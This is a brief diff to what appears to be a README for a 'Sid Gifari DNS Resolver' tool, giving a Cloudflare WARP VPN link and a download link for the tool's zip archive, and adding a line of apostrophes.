@@ -1,4 +1,5 @@
 use warp vpn: https://1111-releases.cloudflareclient.com/win/latest
+'''''''''''''''''''''''''
 tool download link: https://github.com/sidgifari07/Sid-Gifari-DNS-Resolver/raw/refs/heads/main/Sid-DNS-resolver.zip
 
 Sid Gifari DNS Resolver 🛡️💻
